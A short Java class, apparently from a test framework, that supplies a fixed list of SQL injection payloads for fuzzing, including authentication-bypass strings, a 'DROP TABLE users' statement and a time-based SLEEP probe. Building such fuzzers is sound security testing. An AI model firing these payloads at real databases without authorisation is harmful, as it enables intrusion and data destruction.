package com.framework.utils;

import java.util.Arrays;
import java.util.List;

public class SQLInjectionFuzzer {
    private static final List<String> PAYLOADS = Arrays.asList(
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "\" OR \"1\"=\"1",
            "admin'--",
            "1' SLEEP(5)--");

    public static List<String> getPayloads() {
        return PAYLOADS;
    }
}
